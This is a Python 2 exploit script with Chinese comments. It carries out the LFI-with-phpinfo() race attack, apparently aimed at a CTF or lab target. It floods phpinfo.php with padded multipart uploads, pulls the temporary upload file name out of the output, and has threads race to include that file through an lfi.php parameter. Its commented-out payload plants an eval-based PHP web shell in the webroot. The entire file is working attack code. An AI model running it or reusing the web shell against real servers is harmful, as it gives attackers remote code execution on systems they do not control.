#!/usr/bin/python
# coding: utf-8
import sys
import threading
import socket

def setup(host, port):
    TAG="Security Test"
    '''
    PAYLOAD="""%s\r
<?php file_put_contents('/var/www/html/token/log.php', '<?=eval($_REQUEST[1])?>')?>\r""" % TAG
    '''
    with open('index.php.bin', 'rb') as f:
        PAYLOAD="""%s\r
%s\r""" % (TAG, f.read())
    REQ1_DATA="""-----------------------------7dbff1ded0714\r
Content-Disposition: form-data; name="avatar"; filename="avatar.png"\r
Content-Type: text/plain\r
\r
%s
-----------------------------7dbff1ded0714--\r""" % PAYLOAD
    padding="A" * 3900
    REQ1="""POST /token/phpinfo.php?a="""+padding+""" HTTP/1.1\r
Cookie: PHPSESSID=q249llvfromc1or39t6tvnun42; othercookie="""+padding+"""\r
HTTP_ACCEPT: """ + padding + """\r
HTTP_USER_AGENT: """+padding+"""\r
HTTP_ACCEPT_LANGUAGE: """+padding+"""\r
HTTP_PRAGMA: """+padding+"""\r
Content-Type: multipart/form-data; boundary=---------------------------7dbff1ded0714\r
Content-Length: %s\r
Host: %s\r
\r
%s""" %(len(REQ1_DATA),host,REQ1_DATA)
    #modify this to suit the LFI script   
    LFIREQ="""GET /token/lfi.php?file=%s HTTP/1.1\r
User-Agent: Mozilla/4.0\r
Proxy-Connection: Keep-Alive\r
Host: %s\r
\r
\r
"""
    return (REQ1, TAG, LFIREQ)

def phpInfoLFI(host, port, phpinforeq, offset, lfireq, tag):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s2 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)    

    s.connect((host, port))
    s2.connect((host, port))

    s.send(phpinforeq)
    d = ""
    while len(d) < offset: # 偏移没够就接着读
        d += s.recv(offset)
    try:
        i = d.index("[tmp_name] =&gt; ")
        fn = d[i+17:i+31] # 读到缓存文件地址
    except ValueError:
        return None

    s2.send(lfireq % (fn, host))
    d = s2.recv(4096)
    s.close()
    s2.close()

    if d.find(tag) != -1:
        return fn

counter=0
class ThreadWorker(threading.Thread):
    def __init__(self, e, l, m, *args): # 可变参数
        threading.Thread.__init__(self)
        self.event = e
        self.lock =  l
        self.maxattempts = m
        self.args = args

    def run(self):
        global counter
        while not self.event.is_set():
            with self.lock:
                if counter >= self.maxattempts: # 超过最大尝试次数1000
                    return
                counter+=1

            try:
                x = phpInfoLFI(*self.args) # 多线程读缓存文件地址并包含
                if self.event.is_set():
                    break                
                if x:
                    print "\nGot it! Shell created in /tmp/g"
                    self.event.set() # 将标志位设置为true
                    
            except socket.error:
                return
    

def getOffset(host, port, phpinforeq):
    """Gets offset of tmp_name in the php output"""
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # socket初始化
    s.connect((host,port)) # 建立连接
    s.send(phpinforeq) # 发送数据
    
    d = ""
    while True:
        i = s.recv(4096) # 接收4096字节
        d+=i        
        if i == "":
            break
        # detect the final chunk
        if i.endswith("0\r\n\r\n"): # 以0和两次CRLF结尾时
            break
    s.close() # 断开连接
    # print d
    i = d.find("[tmp_name] =&gt; ") # 查找字符串，返回第一次出现时的偏移值
    if i == -1: # 查找失败时返回-1
        raise ValueError("No php tmp_name in phpinfo output")
    
    print "found %s at %i" % (d[i:i+10],i) # 切片取值
    # padded up a bit
    return i+256

def main():
    
    print "LFI With PHPInfo()"
    print "-=" * 30

    if len(sys.argv) < 2: # 命令行参数少于两个
        print "Usage: %s host [port] [threads]" % sys.argv[0] # 文件名
        sys.exit(1)

    try:
        host = socket.gethostbyname(sys.argv[1]) # 将主机名解析为IPv4字符串
    except socket.error, e:
        print "Error with hostname %s: %s" % (sys.argv[1], e)
        sys.exit(1)

    port=80
    try:
        port = int(sys.argv[2])
    except IndexError:
        pass
    except ValueError, e:
        print "Error with port %d: %s" % (sys.argv[2], e)
        sys.exit(1)
    
    poolsz=10
    try:
        poolsz = int(sys.argv[3])
    except IndexError:
        pass
    except ValueError, e:
        print "Error with poolsz %d: %s" % (sys.argv[3], e)
        sys.exit(1)

    print "Getting initial offset...",  
    reqphp, tag, reqlfi = setup(host, port) # 构造两个HTTP协议的Payload
    offset = getOffset(host, port, reqphp) # 查找特征值，获取偏移值
    sys.stdout.flush() # 输出缓冲区

    maxattempts = 5000
    e = threading.Event() # 线程初始化
    l = threading.Lock() # 线程锁

    print "Spawning worker pool (%d)..." % poolsz
    sys.stdout.flush()

    tp = []
    for i in range(0,poolsz):
        tp.append(ThreadWorker(e,l,maxattempts, host, port, reqphp, offset, reqlfi, tag)) # 线程池初始化

    for t in tp:
        t.start() # 冲冲冲
    try:
        while not e.wait(1):
            if e.is_set():
                break
            with l:
                sys.stdout.write( "\r% 4d / % 4d" % (counter, maxattempts)) # 事后统计
                sys.stdout.flush()
                if counter >= maxattempts:
                    break
        print
        if e.is_set():
            print "Woot!  \m/"
        else:
            print ":("
    except KeyboardInterrupt:
        print "\nTelling threads to shutdown..."
        e.set()
    
    print "Shuttin' down..."
    for t in tp:
        t.join() # 完事穿裤子打扫卫生

if __name__=="__main__": # 当被直接运行时，当前模块名__name__为__main__
    main()